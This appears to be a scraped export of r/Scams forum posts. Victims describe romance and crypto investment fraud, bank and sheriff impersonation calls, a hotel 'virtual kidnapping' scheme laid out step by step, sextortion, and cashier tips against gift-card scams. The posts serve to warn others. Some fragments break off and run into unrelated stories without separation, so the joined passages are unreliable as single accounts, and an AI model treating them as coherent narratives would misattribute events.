My husband just whispers ""scam"" to me. I say nothing since the guy was pretty close to us. It was so awkward, the man just standing in line, I was afraid he was going to go person to person since he would not leave, and I was already mentally preparing how to say I don't have any cash. I thought it was weird he didn't give up when no one responded at first. He just stood there, repeatedly saying ""Please, it's for my son! I have a ticket as proof if you want to see it!"" As he brandished the ticket in the air. 

Then one woman gave him money. Then another person. Then another. He kept saying, ""I just need $100 more. I just need $80 more!""

Finally, someone on airport staff yells, ""Sir, get out of line, you are not allowed there. You cannot scam people again.""

Some people in line audibly gasped. One woman yelled, ""He already received money!"" He was on the other side of the line at that point so I didn't see him leave, I can only imagine he raced away the second he was called out.

Then my husband said to me, ""if he was only a few pounds over the limit, why couldn't he have just put the extra weight into a seperate bag and use that as a carry on?"" Which was true, the same thing had happened to us in the past and the ticket agents help you sometimes to lower the weight or redistribute the weight into different bags. The man's story was kind of vague to begin with, and fell apart easily under scrutiny. But I can understand how people would want to help him while under stress themselves waiting in line, possibly worrying about making their flight on time, so close to the holidays, and with the man begging mere feet or even inches from you.

Just wanted to put the word out in case anyone found themselves in this situation or think their family members might be susceptible to such a scam this holiday season. It was a very early morning flight and staff was pretty scarce and I'm sure everyone in line was sleep deprived - I myself only had an hour of sleep the night before since we had to leave so early to make it on time.

1630807488.0,PSA- phone numbers and personal information in posts,"Hello readers of r/scams,

Lately, there has been an uptick in posts that contain personal information. This could be full names, addresses, but the most common information we are seeing is phone numbers. Phone numbers are either being written out in posts, poorly redacted, or not redacted at all. Phone numbers need to be redacted or omitted from posts, otherwise they will be removed.

*But the phone number belongs to a scammer! Why do I need to remove it?*

> Phone numbers are personal information, and posting confidential/personal information is against Reddit's content policy. This can include screenshots of Facebook profiles with the full names still visible, photos of individuals, and phone numbers. Aside from Reddit's content policy, it is incredibly important to note that phone numbers *can* be spoofed, and Facebook profiles can be compromised. What you think is a phone number or Facebook profile for a scammer may belong to an innocent person. 

*So, what if I see something that breaks the rules?*

> It's really important to note how large this sub has gotten. I've been here at the sub for over four years, and it has grown immensely over that time.

I didnt think much of it since because I thought it was an actual friend. I didnt think much of it because she didnt tell me much details.

Last month, she tells me this friend will pay me back when hes done working on his project. Fast forward to this week, I am finding out this friend is in Europe and he cant get his money (15,000,000 Euros) transferred to the USA because some sort of fees. Now he is needing $68,000 to pay for those fees. My mom wants to help him with this. She has asked me to pull out a huge loan in her efforts to help the friend. This friend is supposedly going to pay me all back and plus more. She has also told me that this friend has given her money, so its suspicious. 

She supposedly met this friend last year in Vegas. She sent me pictures of him which are either fake or using someone else's pictures. Also a poorly edited ID of a large Italian company (ENI Energy company) I reverse image searched these pictures. My mom will not listen to me. I am lost on what to do. Should I involve my other family? Any advice or help is appreciated everyone.

Update:
Thank you everyone for the advice. I cant answer all the questions but can make a update. I have seen the Tindler Swindler on Netflix. I just never thought that I would ever be in the situation myself. I just needed more opinions on what to do from this point forward.

I will not give my mom anymore money. I am not going to take any legal action against my mom, she is still my mom. I just need this madness to stop.

I will be contacting family members. I have no siblings but do have a lot of extended family. Its just a case of deciding who to talk to. Theres been a lot of family drama in the past so this mom doesnt talk to some of her siblings. Its a sensitive situation. 

I am not sure how she is involved with this friend. She only refers to him as a friend.

My mom is in her 50s. She isnt elderly enough for me to control certain aspects of her life. 

I understand that I should have seen this scam coming but didnt have details of this friend until yesterday. She initially borrowed the $1000 months ago. She has borrowed money a couple of times in the past and has paid it back. So I didnt question it.

Stayed at an admittedly dodgy hotel in Las Vegas near the convention center for an event. Late one night, around 11pm, I get a call on my room’s phone…
She greets me as the hotel’s front desk and wants to pass me on to the manager for no reason, takes a moment, and then the manager gets on the phone… already odd but ok.
Manager proceeds to tell me their system went down and they’re reverifying all the current occupants so needs my name and birthday. It felt off, so I lied and gave them a fake birthday… they confirmed. Then needed my credit card information to make sure they don’t double charge me for the stay… lol. I said no, he said he’ll call the police to charge me with a fraudulent stay, I said go for it, I’m coming down to the front desk. Get there, several others were called like me.

I try to cut a long story short.

Two years ago, me and a friend of mine have been approached when we were out partying. The guy said he is a professional photographer and we look like models. We were naive and flattered. We exchanged numbers and texted with him over the next few days.

He offered to take pictures of us for our setcard, so we could start a career. It was all discussed and sounded good. 2 hours in his studio, about 10 photos of each and together. In casual clothing and maybe underwear if we feel ok.

But when we arrived the next day, there were two guys, a photographer and the agent. We had a few drinks to ""calm down"" and they told us that we could have great gigs in no time, that they know big producers and things like that. They were good in making this sound real and we were to naive to see through their lies.

The only precondition was, that we proof to ""really want this"". We fell for it.

So, the shooting quickly went from casual via underwear to nude. All in mini steps and we were to invested to stop it. They made us touch each other and then touch them too.

Of course this has not been the start of a thriving model career. We just fell for a scam. We really regretted what we did but just wanted to forget it.

Now, last week, I was contacted via Instagram. The person showed me some pictures from back then and threatened to send them to friends and classmates. He wanted me to send nudes.

I was actually already about to send it, but then had a moment of clearity and stalled. He set a deadline until this Wednesday.

1560379393.0,New (to me) Type of Virtual Kidnapping,"I'm in Mexico on business -- I travel a bit. I also consider myself generally savvy and aware of scams. I knew about virtual kidnapping and all that, but I'll admit that my asleep brain fell for this for just a little bit. I hadn't seen this before, so I thought I'd share.

&#x200B;

I got a phone call on my room phone in my hotel late last night, when I was already asleep asking if I knew a person by the name of X. I do actually know someone by that name, but it is a very, very common name. I was sleep-addled, so this first conversation didn't quite register with me and I accepted the call. X came on the line and then proceeded to tell me that he was a member of cartel Y (a real cartel, by the way) and that they were going through the building because some head guy of another cartel was there and they were going to murder him. Did I understand? He's downstairs at the front desk, and there is going to be trouble.

&#x200B;

I should have immediately hung up, but my mind was not fully awake, and I'm in Mexico, so this was not necessarily entirely 100% unbelievable. I'm in a particularly violence-prone region of Mexico, after all, and that's saying a lot. If I wanted to live, he told me, I would need to follow instructions to the letter. First, as they are going through the building, keep my door locked and do not go outside because there are big bad men with big guns about. Then some questions about who I am and why I'm here -- I did not provide detail, and he got kind of pissed off, but I could play it off as not fully understanding his questions. Meanwhile, I'm thinking that this could be a scam, but then again, who knows and WTF?

&#x200B;

I'm told I need to keep the hotel phone off the hook and transfer to a mobile number. I made a huge mistake in giving them that, because I was still just not quite certain what was going on and frankly, a little nervous about the whole thing. We transfer to mobile, and I have to answer a succession of calls. Of course, questions are: do you have any other phones? Laptop? Turn it all off and stay on the line if you want to stay alive. Obviously, in retrospect, this is about isolation.

&#x200B;

I'm told I cannot stay at this hotel. I have to get dressed, grab whatever cash I have, any medications I need, my glasses and other necessaries, my phone charger and put them all together, because I need to move to another hotel about two blocks away. Right next to the hotel, I'm supposed to buy a new prepaid cellphone with a Mexican number. The people at the hotel (front desk) don't want any trouble, so don't play games with us, because we're going to kill you if you so much as stop there. Don't run, walk calmly. Just make your way out the door, get the phone, we'll be waiting at the store next door, and then you'll go to the new hotel. That hotel, by the way, is a real hotel.

&#x200B;

I'm told to start making my way downstairs. In passing the front-desk, I'm supposed to lower the phone but keep it on -- never hang up -- and absolutely never make contact with the people at the front-desk. After all, they don't want any trouble. Make any mistakes and you're dead. I take the stairs, not the elevator, because I'm looking for a way out. In my mind, there are two possibilities: 1) this is a scam that I do not understand, or 2) this is real, in which case the absolute very last thing I am ever going to do is hand myself over willingly to some self-professed cartel dude. On my way down, I look for possible exits. At the bottom of the stairs, there is an area where you cannot be seen from outside, but the front-desk can see you. I stop there to think about my options. It's next to the kitchen, and I am considering disappearing in there.

&#x200B;

I can now see the front-desk. The young woman who mans the desk does not look at all like someone beset by cartel Y dudes roaming about the hotel. I gesture for her to come over, which she does. I cover the microphone on the my phone (at least, I think I did) and tell her what's going on and ask for help. ""Hang up,"" she says. ""It's a scam."" I'm a little shaken and she gets me a drink to help calm me down. I am a mixture of embarrassed, relieved, and agitated. She calls the security guard over and shows me the cameras they have all over the place and tells me it's quite safe, and she then explains to me how this is supposed to work. Once I calm down and get back up to my room, I am still a little agitated, so I look this up online and find some additional information (included below).

&#x200B;

Here's how the scheme is supposed to work. 1) they isolate you by keeping you on the line and making you shut off any other devices; 2) they get you to get a new prepaid phone (preloaded with exactly 50 pesos, which will last a while; 2) then, you are directed to your new (real hotel). There is never an actual meeting with anyone, they just keep you on the line. 3) They make you get rid of the sim card in your regular phone -- to disable any kind of GPS tracking; 4) they set you up in the new, very real, hotel nearby, and keep you on the line there; 5) They get you to engage in a skype conversation on the new phone, so they have pictures of you. At this point, you are completely isolated. In a new room, where you are threatened with death if you step outside the door. You cannot be reached by anyone but them, because only they have your new number. That is where stage 6) starts: now they call your family and tell them that you have been kidnapped and that they will start cutting off fingers if money is not paid very quickly. They have your pictures to prove it, and you are not only incommunicado but also not to be found in your hotel room.

&#x200B;

It's a virtual kidnapping that eliminates the chance of your family reaching you to find out you're okay. Assholes. I am actually deeply embarrassed that I fell for any of this, but I am putting it up on the off chance that someone might read it and be forewarned.

1696959571.0,Lost 30k from a romance scam. Can finally move on.,"So I'm (28m) finally at the end of a five month scam that finally ended because of this subreddit. I sorted by top and realized some of the best scams overlapped with mine and contained similar elements. It's not a 1:1 story because I had to take a mental health break and I wiped my computer and phone once I found out. Not all details will be here but the spirit is the same:

A text sent to the ""wrong number"".

An extraordinarily hot chinese-american woman, 38, that had her own business, looked independently wealthy, with a great personality. (I had a type and this person just happened to 100% overlap with it.)

Happened to be single, an immigrant that came to America a bunch of years ago, and was just coming from a divorce. A bit of a red flag, but whatever, she didn't have kids anyway. I wouldn't hold it against her.

**The Open.**

I never realized before that a text sent to the wrong number could be the cold open to a scam and so we begun talking and things hit off. She introduced herself and while her writing wasn't 100% since English was her third language, it was believable enough for me.

Things hit off well, she gives me her telegram, and we begun chatting further. We swapped pictures and I told her something along the lines of ""If we weren't a few states away, I would've already asked you out on a date.""

Surprisingly, she said we were a bit far but there's no reason why we couldn't get to know each other. I didn't like the idea of a long-distance relationship but we were both adults and had money (lmao) so I figured why not? We could make it work if it was meant to be.

I started this with a single rule that I ultimately broke:

I would not touch any money until I met her in person.

At this point, we were one month in the scam and I was getting lovebombed pretty hard. We got along really well and for some reason, she was like one of the few women I met that was consistent, shown up when they said they were, and held down a job all the while. I thought I found the one because everything I've seen so far was exactly what I like in a person in general.

A month in, she confesses her love and I admit the same thing to her, although we were going a little fast. We eventually agree on having a vacation on Singapore for our first date. It wasn't really absurd to me at the time because she looked extraordinarily wealthy. I definitely could afford a passport and relocate.

**The Actual Scam**

While I was busy getting my things together for a passport she finally opens up with a few exploits from her daytrading in cryptocurrency. She was pulling in pretty impressive amounts and wanted me to get in on it.

I told her: Sure, I was interested but I'm not touching any money until we meet in person.

She then proceeded to constantly bug me and show me the gains she was getting from her trading. I eventually caved, threw in 200$ in BTC, and she makes me an extra 100$ through this mock website of an actual website. 

I apologize for doubting her.

She got upset, berated me, told me that she was polite to me up until this and she gets very emotional when people begin doubting her.

I told her I wouldn't doubt her again.

I take 3000$ in credit, turn it in BTC, and she puts in 9000$, and we suddenly had a lot more money to work with. I was pulling in thousands of dollars a day through this website and over the course of one month I had 40,000$ in profit. I could actually afford college and work my way into a position where I was just as successful, if not more, as this lady, and our relationship would actually last long-term that way.

Now to withdraw the money.

She started showing me how to do this over telegram via a series of screenshots and I followed her instructions exactly. I hit up ""customer support"" and suddenly I'm on the hook for a 20% deposit, but I'll get that money back but this person that was going to buy the bitcoin for the withdraw also was going to do the same.

Do I know who? No. 

Do I even know the custom service's representative's name? No. 

Did they even have a manger I could talk to? No.

This website even has a few misspellings and it doesn't go back to the official website in anyway.

20% deposit due within two weeks.

No big deal, we make the amount in three weeks and got an extension at some point so there was no late fee. I owe her 10k now.

Then I ""accidentally"" messed up the BTC address by the last digit to withdraw my money. I find out after obsessively checking it and I thought it was gone, but I asked customer service, waited an hour, and they managed to stop it just in time!

Another 20% due within two weeks, but you'll get your money back I promise.

We make it in 4 weeks.

Cool, here's a late fee. Fix it in two weeks.

I pay the late fee weeks later.

I felt so obligated to keep going on this increasingly dumb loop of paywalls because I **needed** to recover **her** money back that I never once begun to ask about myself. I was so utterly convinced of her existence that I never once considered my own well-being in this whole process.

I eventually begun to run out of money and then her tune changed from ""lets not talk to anyone about this"" from the very start to her wanting me to hit up my friends and family. I'm so grateful I haven't told anyone about this or asked anyone for money because I was really, really depressed and was undergoing a personal hell of having my ""girlfriend"" constantly reminding me that I was ""supposed to be a man"" constantly reminding me of how this is my fault.

When I confessed to her I wasn't feeling too well, she started to grow extraordinarily mean to me, telling me how she needed her money back and how she was due taxes and she wouldn't ever take ""no"" for an answer. 

I was out of money, my credit was tanked, and I couldn't get balance transfers. I had only a few options left:

Hit up friends/family (no)

Take a title loan. (how will I work?)

And I proceeded to do none of those, thankfully. I was begin questioning that if she was worth this commitment and was wrestling the idea of not honoring repayment I owed her. I had plenty of depression naps, phone calls, and watching letsplays after work.

Finally, I secured a balance transfer for 5k, took out a cash advance on another card, bundled it up with what little money I had left, and paid the last fee I ever needed to pay before the massive amount will get transferred to my account and everything works out in the end.

That's nice, but the authorities have all determined that due to the previous late payments, wrong address, etc, etc, etc, etc that your credit score is now 95 and you need to pay 5k to bring it back up or else you can't withdraw from this website.

I apologized to my girlfriend, told her I give up, she deserves a man with more money than I, and then proceeded to ghost her for what was supposed to be a few days but turned out to be forever.

**Epilogue** 

It was at this point that I was able to reflect on how shitty I was treated the last couple of months and then looked through scams on this subreddit and realize a lot of it was similar to mine. In fact, there was another subreddit that had a very, very similar situation to my mine and I was able to finally move on.

Despite being 30k in debt, I'm actually way happier now. It feels like breaking up with an abusive ex and it all becomes clearer. 

I never owed her 16,000$, it was all part of the scam.

I never messed up the address and the bitcoin was never recovered, it was never there.

The text I accidentally got sent came from a number that doesn't even exist in an area code that doesn't even reflect the same area she claimed to be from.

I felt suicidal back for the first time in my life then from my own incompetence and how I ruined such a perfectly good relationship. Now I just realized I was taken for a ride and there are genuinely evil people out there and while I should've stuck to my rule, anyone can be taken advantage of like this if they press the right buttons.

It'll be rough to recover, but at least I got scammed now. I couldn't imagine what it'd be like to be late in my career, in a well paying job, with a lot more income than just 30,000$. At the absolute latest I'll get this paid back in three years and I'll never forget this.

If you read all of this: Thank you for your time. The damage that was done was self-contained and I don't really want to talk about it, especially with friends and family, nor do I want my coworkers to know because I know my boss will take advantage of someone indentured like this.

But I needed some way to talk about it so I can get back to fixing this.",Scams,8638,1642,217,1
1680273265.0,Came across some type of scam yesterday while delivering a pizza,"Hey everyone, so I like to think that I’m pretty well-versed when it comes to current scams and what not but yesterday I had a weird experience and I still don’t know what to make of it. 

So yesterday I went to deliver pizza to a customer. It was a new customer and I have never delivered to the house before and when I knocked on the door the man who answered was elderly and said I didn’t order anything so I said oh OK I’m sorry and went back to my car and called the number on the receipt. A man answered and stated his whole name and it almost sounded like a robot at first, but then I started to hear a man with an Indian accent. It was almost as if he was using a voice changer to get rid of his accent, if that’s even a thing, or maybe it was just the cell connection making it sound strange 

I told him he must have given the wrong address because I knocked on the door and the person said they hadn’t ordered anything and he said no that’s the right address and he repeated it back with the area code and the area code was wrong which also made me suspicious. He said this is a surprise for my friend so I said oh OK because that does happen. Sometimes we will get a delivery and it’s for someone’s birthday and they don’t know that it’s coming. But the thing is this wasn’t paid for so I said that to him, and he says just put him on the phone you’ll understand in a bit. 

So I go knock on the door again and the guy answers and I said hey so-and-so is on the phone they said that this is a surprise for you and he says oh yeah I know who that is so at this point he is on speaker phone and he says hey Paul it’s me, I remembered the other day you said you had been craving a pizza so I wanted to surprise you and send you one.  And he was very thankful but then the dude drops the bomb and says hey Paul, but do you think you’d be able to pay for this? And the guy says what? No I don’t think I’m going to be able to do that. So then the guy on the phone says to me is there a way to pay online? I said you could call the restaurant and pay with a credit card but I can’t handover the pizza yet. He says OK he will and tells Paul he’s gonna call him in a bit on this new number. 

I get back to the car and call my boss and tell him what’s going on and he says he hasn’t received a call yet to stay there, he calls me back and says he called him twice and he’s not answering Don’t give him the pizza. When I got back to the restaurant, he says he eventually got the guy on the phone and he said he was gonna call back with a credit card in 10 minutes and that’s when he said no I’m having my driver come back.

I went back to the guys door again at the end and explained what was happening and asked him how well he knew this guy and he said not that well and I said have you met him in person and he says no we’ve only spoken over the phone about business deals and stuff, and I told him to be careful because this is most likely a scam, and not to give him any personal information or talk to him and he says you know what you’re probably right 

Have any of you guys come across anything similar to this? What I’m trying to figure out is what the endgame here would be. Only thing I can think of is it similar to the fake checks scam, this guy said they talked about business dealings so I was thinking he’s trying to get friendly with him over the phone. Send some food to seem nice and make it look like he’s an actual person, and then he says, let me front you 10,000 to get an investment going and then he ends up sending 20,000 tells Paul just to cash it and send the other 10 back and then the whole check bounces and he’s on the hook for all of it, basically a larger version of the fake check scam

1692847498.0,Just fell for a bank scam. devastated.,"Looking back at it, it feels unbelievable I fell for this at all. Never in a million years did I think I would. I feel like an idiot and I’m devastated knowing I’ll probably never get my money back. 

So, I received what I believed to be an automated text message from my bank. It had the 5 digit phone number like all the other automated messages I receive, and it was asking if I used my debit card, with the correct last 4 digits of my card listed in the message, to authorize some transactions they listed, and it said if I recognize this activity to send YES and if I didn’t to send NO, but written in the authentic format that my bank usually sends these messages in. I typed NO, of course, and it immediately responded that the support department would contact me shortly. I then received a phone call from the exact same phone number as my bank (which I now realize was spoofed, of course). They asked for my name, phone number, had me confirm that I did not authorize those transactions, etc. They then told me they were going to go ahead and cancel my card and send me a new one, the whole regular gist of it. Then they said that the problem was that one of the transactions was a Zelle payment that had gone through, and that it was difficult for the bank to cancel Zelle because it’s an immediate payment, but that they can provide me with a credit in the meantime, and I just had to send in a support ticket through a transfer for the amount I needed to be credited. They said I was going to be texted a ticket code, and to input that code and my name into the money transfer part of my banks mobile app. I was taken aback, and said this all seemed rather unorthodox, and asked if they could verify their identity first as actually being my bank. They said they completely understand my hesitation, and that they would provide any information I needed. They then proceeded to give me the security code of my debit card, my email, and the last 4 digits of my account number. How they got all this information, I don’t have a clue. After a little more hesitation, they asked if I would like to speak to their supervisor, and proceeded to put me on a brief hold. During the hold, music played in the background with the same narration as my bank usually has of some guy talking about random bank benefits. After that and a bit of pressure from the “supervisor,” I stupidly sent the payment that I didn’t even realize was a payment I was sending. As soon as I sent it, I realized what this was. They tried getting me to send another payment, but I hung up and called my actual bank, and explained everything. Long story short, I’m unlikely to get my money back. I’m so incredibly disappointed in myself. I feel like a complete moron.

1677793027.0,My parents got scammed for their life savings,"My parents got scammed for their life savings. Unfortunately I only found out about this after they had already given over a lot of money, or I would have tried to stop them from going for it. I don't have all the details, but it was some kind of investment scam, where my father was contacted by a stock broker and told that a couple decades ago a stockbroker had bought shares in his name that he was unaware of, and they were now worth a lot, but he had to buy more shares before he could sell. There were several developments which all seemed to require more money. Eventually the money was ready to be sent from Hong Kong but the government was blocking it etc. At one point he was able to speak with another shareholder who had already received their money (but I suppose this was faked as well). Eventually the money was supposedly sent, but never arrived, and they took the proof of transfer to a bank, who said it seemed to be forged. Also, everyone he was in contact with about this is now impossible to contact.

Anyway, it seems like my parents, who are retired, have lost all their money and don't have a place to live. I know it's probably hopeless but I am wondering if there is any way to get any of the money back, any way to trace the scammers, and/or if anyone knows of scams like this. Thank you.  


Edit:   
My parents are not super elderly. They're in their 60s and my father, the one who fell for the scam, is quite tech aware. I suspect he would not have fallen for anything other than an investment scam, but this seemed well designed to target his particular sensibilities, and it was very elaborate. It turns out he was not as careful with his research as he led me to believe, which is very unfortunate.

1689271255.0,I was scammed,"Sharing for awareness. 

Received a call yesterday from ‘Sargent Woods’ from the sheriff’s office who informed me I had been absent from a federal jury summons. 

While on the call I googled his name and the name of the judge he gave me, both returned legitimate hits. He also asked me to verify my phone number and address which he provided first (in hindsight this is relatively public info). 

Goes on about consequences and that I have two options to either go into the station and get processed or go ahead and pay bond and get an expedited hearing scheduled. 

Sadly I fell for it and paid $2,000 by Zelle and another $500. The Zelle payment was placed on hold by my bank (thank you) and so he asked me to use a different payment for the $500, which I unfortunately did. I used Apple Cash and that went through. 

When he asked me to call my bank and ask them to release the Zelle payment I agreed, he also told me that the case was under a gag order and not to tell the bank what the payment was for. At this point I started to see the many red flags through my fear and ultimately canceled the Zelle payment. 

Lesson learned: The sheriff will never call for a missed jury summons and never ask for payments over the phone. Also, never use payments like Apple Cash, PayPal, Zelle, etc with anyone you don’t know personally.

Customer comes to you to buy many Steam/iTunes/google play or other gift cards. There are so many scams that the scammer has the person buy gift cards.

Ask: Why are you buying these cards? What are they going to do with them when they get them? How do you know [person]? When is the last time you saw [person] face to face?

If they have only talked via Facebook, if they haven’t talked to [person] face to face in many years, if they say they are buying a puppy online... etc deny the sale. Also, it never hurts to ask a peer or supervisor for help. Sometimes just asking for a second opinion will stop the transaction.

Scam 2:
Customer comes to purchase a prepaid gift card or debit card. They want to load $500 onto the card and say they have a “cash card” for payment and walk you through the steps on how to use said “cash card.” Customer typically will try to reach over your register and try to complete the transaction as if they paid cash. Be vigilant during card loads and call for backup when you feel uncomfortable.

Scam 3:
Customer buys a pack of gum or something similar with large bills. They will pull out many bills and ask you to break them and/or will say they were given the wrong change. They will be very polite and talk very fast. They may lay out bills on the counter to further confuse you. They will have you swap bills with them until you are hundreds short. This is called a quick change scam.

The only way to prevent this scam is to close your drawer immediately after every transaction. Refuse to reopen it without a peer or supervisor present.

Few weeks ago, my grandmother was on her phone and looking at social media. Tbh I have no clue which app, but I’ll ask her and add it if I remember. Anyways, she saw an ad for ‘JC Penney’ and they had an amazing sale going on. She got two tops for under $20. She didn’t mention anything to me so I didn’t know.

Luckily, I am on her bank account so I can purchase anything she needs. (I am her caretaker, and we live together.) I check our accounts fairly regularly. Thankfully, I did check it a day or two after this. However, the charge was for something titled ‘vigont’. And they had added an international fee. I asked her and she told me what she had bought. Quick google search and it was clear this was a scam. 

I called the bank, reported the charge being a scammer and had a new card issued to her. And had a talk with her about not clicking on ads, instead always go to the actual site manually. And also told her to please tell me when she finds a sale that seems too good to be true. 

I felt bad for her because I know she was embarrassed. She’s still mentally healthy, her issues are physical, but she’s older and easily tricked like most elderly people.

PS - I thought just came to me. FUCK scammers, right? We all agree on that?
If our behaviour in the comments turns OP off from posting in the future and commenters see what’s being written and that turns *them* from posting…I’d say its’s likely people are *not coming forward* to ask whether something is a scam and potentially ACTUALLY getting scammed. 

We don’t want anybody being scammed, right?

I am about to send an application for short term housing for the summer. There is this Facebook group where I found this person offering month to month housing in a very good location for me. 

As I am about to send the rental application fee, I choose goods and services and submitted. They refunded it back to me and told me to resubmit using  ""friends and family"". Is that normal? I am new to this, and I am really interested in this apartment, thank you

Update: thank you for helping me! Moreover, here are some sketchy stuff I realized that were off putting

- housing is in downtown Boston, near financial district, 1.2k monthly. It's seems VERY low from the other rates I see online, I guess I had hope

- security deposit was $300, not $1200 (I assume it is always the same price as the monthly rent?)

- many grammatical mistakes in the lease, forms, etc.

He did give me his phone number to call him though. Did not take the chance. Saved me potential hundreds, thanks r/Scams",Scams,996,182,28,1

I’m 20, and the person claimed to be 21, truthfully I’m horrified, I did not send any money, as I’ve heard that these scammers are usually all bark no bite. What should I do? I fucked up bad, i guess I’m just scared that they might actually go through with it. Has anyone else been through this or has any advice?

1628086848.0,Why You Dont want to Answer a Call You Don’t Recognize,"If anyone is wondering whether or not to answer those annoying spoof calls, just to mess with them or out of curiosity, here is a good reason to not do it.  Last week, my phone began buzzing at 4:30AM with NO CALLER ID displayed.  I of course did not answer as I was sound asleep. But it woke my wife up. She ignored it as well. But, every 20 minutes, it happened again... and again... and again... for a total of about 10 times. My wife finally couldn’t take it any more, worried that it was some emergency.  Well, before I could stop her, answered it.  There was of course no one on the other end and the calls stopped after that. But that’s where the real fun begins.  Within 24 hours, my phone started ringing pretty much non stop now with spoofed numbers.  It will show a local number with the same or similar area code and prefix or it will actually show a real name for someone within the same area code. I’m getting 30 or 40 of these a day now whereas before, maybe one or two.  I’ve had this number for over 20 years but if this doesn’t stop, I’m going to have to change it guess.  So, don’t let curiosity get the best of you. Dont answer it. If it’s important, they will leave a message. 

On a side note, maybe it’s time that we all band together and DEMAND that the comm companies do something about this.  Billions of dollars scammed and we still are no further along than an occasional caller ID warning about it being potential scam that rarely works.  We’ve put a man on the moon but can’t stop a damn phone call that is obviously a scam call. Urgh!!  Nonstop ringing phones put me in a bad mood.   Can you tell?  ;)",Scams,1632,312,49,1
1581780892.0,I received a package I did not order from Amazon delivered to my house. Amazon told me to keep it. It was an iPhone 11.,"Last weekend I got email bombed, it was a nightmare. Thousands of spam emails for random websites and newsletters from all over the world started flooding in.

I immediately think I got hacked, and I was right. My paypal as well as my amazon accounts were compromised and someone had made purchases to the tune of about $3,000. I call Amazon, shut down my amazon account. I call my bank, cancel my bank card. Change all my passwords and set up 2 step verification. I filed fraud charges with paypal and my bank, and my money is returned to me by the end of the week.

Today, I received a package in the mail, addressed to me, and I have not made any orders since this incident. I open it up, and inside is a SimpleMobile iPhone 11 Pro 64gb. No packing slip, receipt or return address anywhere.

I call Amazon, tell them that back story, give them my email and the tracking code from the package and they tell me this order was purchased with my bank card that I canceled last weekend. I tell them the exact amount of one of the charges I got last week, and they say yes, that is this phone. The exact amount for this phone had already been refunded to my account.

The whole time the guy on the phone is just as confused as me. He keeps saying this sounds like a known scam technique and they will launch an internal investigation, but cannot notify me or give me a resolution. I ask him so what do I do with this phone? And the guy says ""you have no obligation to do anything with it, you can give it away or keep it, we will not accept the return"".

So now I'm stuck wondering to do with this really expensive phone I have no use for. I think it's locked to SimpleMobile so i don't think I can just put my sim card in.

TLDR: I was hacked and one of the orders from the hack arrived to my house a week later after I had already received a refund. Amazon told me to keep an iPhone 11 pro I did not pay for, and now I don't know what to do with it.

1669600764.0,We suspect my mother (62f) is a victim of a ten-year long romance scam with a man (37m) she met online from Egypt. He is now here in Canada illegally and we are worried for her safety,"TLDR,

My mother lives in Canada and met and married a man from Egypt 10 years ago who is nearly half her age. He’s been living a separate life from my mother in Egypt and has another wife and two kids. Although he has made no solid attempt to have a life with her here in Canada, my mother has been groomed and manipulated into financially supporting him and his family. He became the sole beneficiary in her will last year. Recently, he has made his way to Canada through illegal channels and is now seeking asylum as a refugee, despite access to options for  sponsorship/immigration that are available for spouses. We believe he is now here in Canada to collect his inheritance and we worry about my mother’s safety and financial wellbeing.

\--------------

I (37m) believe that my mother (62f) is being taken advantage of financially and emotionally manipulated by her husband Ahmed (37M). She met him online 10 years ago and has been married to him for 8 years. When they initially met and she went to Egypt to visit him for the first time, my family and I tried very hard to convince her not to go. We expressed concerns about her safety on the trip and how suspicious the relationship was with such a large age gap and the nature of their meeting (he reached out to her). She went anyway and continued to have a relationship with this man.

Two years later, she converted to Islam (which my family and I support). This was out of character for her and we attribute it to his manipulation and influence. Since then, she has become more and more extreme in her beliefs. We have since come to understand that he has weaponized his religion to manipulate her.

Two years into the relationship she returned from a trip to Egypt and announced that she had married him. This took us all by surprise as she didn't tell anyone of her plans. We once again expressed reservations and tried to discuss it with her but she refused to engage. 

Time went by with a few other red flags popping up here and there but for the most part, things were quiet. About a year ago, my mother’s close friend came to us with startling details about the marriage. She let us know that my mother has been financially supporting him for years and has purchased him a house and two cars (one of which he crashed) in Egypt. We also found out that he has another wife and two young children (1f and 2m) in Egypt. My mother found out about his other wife and child after the fact but has since been manipulated into accepting and supporting it. She has been providing monthly financial assistance to that family. My mother is not a wealthy person and likely has an annual income of $50,000. Cost of living is very high where we live and I know she isn't doing well in that regard. She is close to the age of retirement and it’s recently come to light that she has been withdrawing significant amounts of money from her RRSP (401K equivalent) to financially support Ahmed and his family. We worry that he has depleted her life’s savings.

After these revelations, we confronted my mother about it. She completely shut down and would only respond to our concerns and questions with stuff like “I’m your mother and I know what I'm doing” or “he's my husband and I love him” etc. I requested that she come to family counseling with us to talk about the situation but she refused and later we found out this was because he strongly objected to the idea. During interactions with her after things calmed down, she would not address the issue and she would just act like things were normal. We went along with it for the sake of having a continued relationship with her and not driving her further to him by isolating her. 

He has not been able to immigrate to Canada in the past and we’re not sure if this was because he couldn't or didn't want to. Last month, I got a phone call from my mother saying that she had been arrested at the border trying to get him across illegally. We lost it. We expressed how dangerous that was and how it put her freedom in jeopardy and told her how hurt we were that she chose to hide such a big decision from us. The arrest was very traumatic for her and caused significant stress. We sought legal advice regarding the situation and she was strongly advised to cease contact with Ahmed until she found out if she was charged or if there was an ongoing investigation. 

A few days after she got released and was back at home she called me in the middle of the night with chest pains. She had a stress induced heart attack at two in the morning. My family and I cared for her in the following weeks until she was well enough to take care of herself. We later found out that during her hospital visit she was still in contact with Ahmed against the lawyer's advice. Thankfully, she got a call from the border agency last week saying that there were no charges or fines being levied against her. Her recklessness with the severity of the situation was very frustrating. 

Last week my mother’s friend reached out to us again out of concern. It turns out that Ahmed made it across the Canadian border illegally and has supposedly started a claim for asylum (we don't know for sure if his application has been submitted yet). He has been living at my mother’s house for the last two weeks. This was before she knew about the status of the charges at the border. 

My sister went there to confront him a few days ago. The responses that she got from him were a bunch of half truths and refusal to answer questions. For example; when she asked about what he planned to do with his wife and two small children in Egypt he just sat there and smugly smiled at her, refusing to answer the question. 

Last year my mother drafted a will that made me executor of her estate and gave the majority of her positions to my brother and I. My sister was left out of the will because of something to do with Islam. We have since come to know that at this moment Ahmed is now the sole benefactor and that there was a stipulation that he needs to be in the country for it to be in effect (which we believe to be the major motivation for his border crossing). We couldn't care less about getting the money and have suggested that she donate it to charity instead of giving it to us or Ahmed. 

At this point we are considering our options for how to deal with the situation. There is concern that if we have him deported it will just push her further to him. Distance has not been a barrier to her financial abuse in the past. I'm writing this post to see if anyone reading this has had a similar experience and can offer suggestions on how to protect my mother.",Scams,6642,1230,86,1

The guy acted like he needed a personal assistant, and I didn’t know any better so I went for it. I even called around a few hotels for him but never booked anything because he wouldn’t ever confirm. 

When it came time to pay me, he had me open a USAA bank account, and transferred the funds to me. It was about $3,000. All was looking good, and then when I went to send some of it back the teller was like “honey you’re being scammed.” So they ended up freezing the account. 

